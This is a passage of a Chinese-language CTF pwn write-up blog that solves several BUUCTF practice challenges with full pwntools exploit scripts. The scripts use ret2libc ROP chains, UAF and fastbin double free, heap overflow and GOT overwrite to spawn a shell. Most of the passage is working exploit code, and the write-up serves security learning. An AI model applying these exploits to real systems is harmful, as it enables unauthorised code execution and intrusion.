class="string">"arttnba3"</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'A'</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b'\xe1'</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">"libc addr: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b'A'</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">'__libc_realloc'</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>运行即可get shell</p><p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p><blockquote><p>不得不说V&amp;N出的题质量还是可以的</p></blockquote><h1 id="0x028-jarvisoj-level3-x64-ret2csu-ret2libc"><a href="#0x028-jarvisoj-level3-x64-ret2csu-ret2libc" class="headerlink" title="0x028.jarvisoj_level3_x64 - ret2csu + ret2libc"></a>0x028.jarvisoj_level3_x64 - ret2csu + ret2libc</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/wKnv9UQdNWiGAgq.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/zZDt4oywbmu2Rgp.png" alt="image.png"></p><p>直接就有一个很大的溢出</p><p>由于不存在可以直接getshell的gadget，故考虑ret2libc：先泄漏出write函数真实地址后使用LibcSearcher查找libc版本后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>两个小gadget的地址如下</p><p><img src="https://i.loli.net/2020/12/01/Uz1lFs8roh9uSye.png" alt="image.png"></p><p>故构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>) <span class="comment"># remote('node3.buuoj.cn',26836)</span></span><br><span class="line">e = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(write_plt) + p64(e.sym[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/12/01/9YlXciZazB3WoQU.png" alt="image.png"></p><h1 id="0x029-bjdctf-2020-babystack2-integer-overflow-ret2text"><a href="#0x029-bjdctf-2020-babystack2-integer-overflow-ret2text" class="headerlink" title="0x029.bjdctf_2020_babystack2 - integer overflow + ret2text"></a>0x029.bjdctf_2020_babystack2 - integer overflow + ret2text</h1><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/01/e2jUYcNvISPsZqy.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/01/j2BrJifVY48SbTK.png" alt="image.png"></p><p>read读入时会把signed转成unsigned， 输入-1即可绕过检测</p><p>同时我们发现存在后门函数，返回至此即可</p><p><img src="https://i.loli.net/2020/12/01/MHwmRf2q1tEk9ro.png" alt="image.png"></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bjdctf_2020_babystack2'</span>) <span class="comment"># remote('node3.buuoj.cn', 25058)</span></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(str(<span class="number">-1</span>).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/12/01/xLOq52VBcJ74bUm.png" alt="image.png"></p><h1 id="0x02A-hitcontraining-uaf-UAF-fastbin-double-free"><a href="#0x02A-hitcontraining-uaf-UAF-fastbin-double-free" class="headerlink" title="0x02A.hitcontraining_uaf - UAF + fastbin double free"></a>0x02A.hitcontraining_uaf - UAF + fastbin double free</h1><p><del>漏洞直接在题目名称里说明了事UAF</del></p><p>惯例的<code>checksec</code>，发现只开了栈不可执行保护</p><p><img src="https://i.loli.net/2020/12/03/xhMBIPmZ2V8RHyu.png" alt="image.png"></p><p>拖入IDA进行分析，我们可以发现这个程序有着<strong>分配、打印、释放堆块的功能</strong></p><p>不难看出在添加堆块时首先会分配一个8字节大小的chunk，该chunk前4字节储存一个函数指针，后4字节则储存实际分配的chunk的指针</p><p><img src="https://i.loli.net/2020/12/03/6Fg3EXu5rqiH9wQ.png" alt="image.png"></p><p>在打印堆块时会调用小chunk中的函数指针来打印堆块内容</p><p><img src="https://i.loli.net/2020/12/03/m2nw4WfoP8cGgsS.png" alt="image.png"></p><p>同时我们可以发现在释放堆块的过程中并未将堆块指针置0，<strong>存在UAF漏洞</strong></p><p><img src="https://i.loli.net/2020/12/03/ZkwVJ34ifBMCytQ.png" alt="image.png"></p><p>同时我们可以发现存在后门函数</p><p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1606984117052.png" alt="1606984117052"></p><p>故考虑通过fastbin double free分配到同一个堆块后改写函数指针为后门函数地址后打印即可getshell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./hacknote'</span>) <span class="comment"># remote('node3.buuoj.cn',28832)</span></span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Note size :"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content :"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">8</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">8</span>, p32(backdoor)) <span class="comment"># idx 2, overlapping</span></span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/12/03/yKXTYzOgBD4HIPW.png" alt="image.png"></p><h1 id="0x02B-ZJCTF-2019-EasyHeap-fastbin-attack"><a href="#0x02B-ZJCTF-2019-EasyHeap-fastbin-attack" class="headerlink" title="0x02B.[ZJCTF 2019]EasyHeap - fastbin attack"></a>0x02B.[ZJCTF 2019]EasyHeap - fastbin attack</h1><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/12/03/xyaWKuVEgNkX7rs.png" alt="image.png"></p><p>拖入IDA进行分析，可以发现该程序存在分配、编辑、释放堆块的功能</p><p>漏洞点在于编辑堆块的地方，可以输入任意长度内容造成堆溢出</p><p><img src="https://i.loli.net/2020/12/03/wRoqFJ6Z5VXpLeM.png" alt="image.png"></p><p>利用这个漏洞我们可以修改fastbin中的fd分配fake chunk来进行任意地址写</p><p>在bss段附近我们可以找到一个size合适的地方</p><p><img src="https://i.loli.net/2020/12/03/SjcMlvYBCKwhfp6.png" alt="image.png"></p><p>由于plt表中就有system函数，故考虑分配一个bss段上的fake chunk后修改任一堆块指针为<code>free@got</code>后修改<code>free@got</code>为<code>system@plt</code>后free掉一个内容为<code>&quot;/bin/sh\x00&quot;</code>的chunk即可get shell</p><p><img src="https://i.loli.net/2020/12/03/w2WaI8uy7Sb1hsz.png" alt="image.png"></p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26930</span>)</span><br><span class="line">e = ELF(<span class="string">'./easyheap'</span>)</span><br><span class="line">backdoor = <span class="number">0x8048945</span></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Your choice :"</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content of heap:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Size of Heap : "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Content of heap : "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 3</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4</span></span><br><span class="line"></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    payload = <span class="string">b'A'</span> * <span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span> - <span class="number">3</span> + <span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">114514</span>, payload)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 5, fake chunk on the bss</span></span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">b'\xaa'</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(e.got[<span class="string">'free'</span>])</span><br><span class="line">    edit(<span class="number">5</span>, <span class="number">0x100</span>, payload2)</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x10</span>, p64(e.plt[<span class="string">'system'</span>]))</span><br><span class="line">    </span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b'/bin/sh\x00'</span>)</span><br><span class="line">    free(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>运行即可getshell</p><p><img src="https://i.loli.net/2020/12/03/R5qOZ8lECUYPbN6.png" alt="image.png"></p><blockquote><p>其实有一个cat flag的后门函数，不过pwn的最终目的自然是getshell，<del>所以这个后门函数对👴来说不存在的</del></p></blockquote><h1 id="0x02C-babyfengshui-33c3-2016-got-table-hijack"><a href="#0x02C-babyfengshui-33c3-2016-got-table-hijack" class="headerlink" title="0x02C.babyfengshui_33c3_2016 - got table hijack"></a>0x02C.babyfengshui_33c3_2016 - got table hijack</h1><p><del>堆题集中地带请小心</del></p><p>惯例的<code>checksec</code>，开了NX和canary</p><p><img src="https://i.loli.net/2020/12/03/9dq2QrJkFpe1uwt.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/04/e1UhWOLn3pu7BXd.png" alt="image.png"></p><p>我们不难看出分配堆块时所生成的大致结构应当如下，且<strong>该结构体malloc的大小为0x80，处在unsorted bin 范围内</strong></p><p><img src="https://i.loli.net/2020/12/04/aucnheQl23Z8CbK.png" alt="image.png"></p><p>漏洞点在于对输入长度的检测，它是检测的是<strong>我们所输入的长度是否大于从description chunk的addr到struct chunk的prev_size的长度</strong></p><p><img src="https://i.loli.net/2020/12/04/6HFv8WPtpDZcbgN.png" alt="image.png"></p><p>在常规情况下我们似乎只能够覆写掉PREV_SIZE的一部分，不痛不痒</p><p>但是考虑这样的一种情况：我们先分配两个大块（chunk<em>4，其中第一个块的size要在unsorted范围内），之后释放掉第一个大块，再分配一个size更大的块，unsorted bin内就会从这个大chunk（由两个chunk合并而来）中切割一个大chunk给到description，之后再从下方的top chunk切割0x90来给到struct，这个时候*</em>由于对length的错误判定就会导致我们有机会覆写第二个大块中的内容**</p><p><img src="https://i.loli.net/2020/12/04/uveEXY9RBpGIofU.png" alt="image.png"></p><p>故考虑先覆写第二个大块中的description addr为free@got后泄漏出libc的基址，后再修改free@got为system函数地址后释放一个内容为<code>&quot;/bin/sh&quot;</code>的chunk即可通过<code>system(&quot;/bin/sh&quot;)</code>来get shell</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./babyfengshui_33c3_2016'</span>) <span class="comment"># remote('node3.buuoj.cn',26486)</span></span><br><span class="line">e = ELF(<span class="string">'./babyfengshui_33c3_2016'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"Action: "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, name, length:int, descryption)</span>:</span></span><br><span class="line">    cmd(<span class="number">0</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size of description: "</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"name: "</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">b"text length: "</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text: "</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, length:int, descryption)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"index: "</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text length: "</span>)</span><br><span class="line">    p.sendline(str(length).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"text: "</span>)</span><br><span class="line">    p.sendline(descryption)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">"arttnba3"</span>, <span class="number">0x10</span>, <span class="string">"/bin/sh\x00"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    big_size = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span></span><br><span class="line">    padding_length = <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x80</span> + <span class="number">8</span> + <span class="number">0x10</span> + <span class="number">8</span></span><br><span class="line">    new(big_size, <span class="string">"arttnba3"</span>, padding_length + <span class="number">4</span>, <span class="string">b'A'</span> * padding_length + p32(e.got[<span class="string">'free'</span>])) <span class="comment"># idx 3</span></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b"description: "</span>)</span><br><span class="line">    free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = free_addr - libc.sym[<span class="string">'free'</span>]</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>, <span class="number">0x10</span>, p32(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>运行即可get shell</p><p><img src="https://i.loli.net/2020/12/04/V4Io3j6Zyqaipx5.png" alt="image.png"></p><blockquote><p>以前做堆都是64位起手，这32位的堆题属实把我坑到了，<del>我愣是拿着64位的libc怼了半天，以及毫不思索就写的0x10的chunk头</del></p><p>本题原题来自于C3CTF，歪国人的题目质量其实还是可以的（当然现在我也就只能写得出签到题233333</p></blockquote><h1 id="0x02D-picoctf-2018-rop-chain-ret2libc"><a href="#0x02D-picoctf-2018-rop-chain-ret2libc" class="headerlink" title="0x02D.picoctf_2018_rop chain - ret2libc"></a>0x02D.picoctf_2018_rop chain - ret2libc</h1><p>惯例的<code>checksec</code>， 只开了NX保护</p><p><img src="https://i.loli.net/2020/12/04/4g6RJGxlf73ZTAB.png" alt="image.png"></p><p>拖入IDA进行分析</p><p><img src="https://i.loli.net/2020/12/04/fBGecSvgaFmsdCb.png" alt="image.png"></p><p>很大很直接的一个溢出的漏洞</p><p>由于没有能直接getshell的gadget，还是考虑ret2libc：构造rop链泄露libc基址后执行<code>system(&quot;/bin/sh&quot;)</code>即可</p><p>构造exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./PicoCTF_2018_rop_chain'</span>) <span class="comment"># remote('node3.buuoj.cn', 28376)</span></span><br><span class="line">e = ELF(<span class="string">'./PicoCTF_2018_rop_chain'</span>)</span><br><span class="line">offset = <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'puts'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(e.got[<span class="string">'puts'</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span 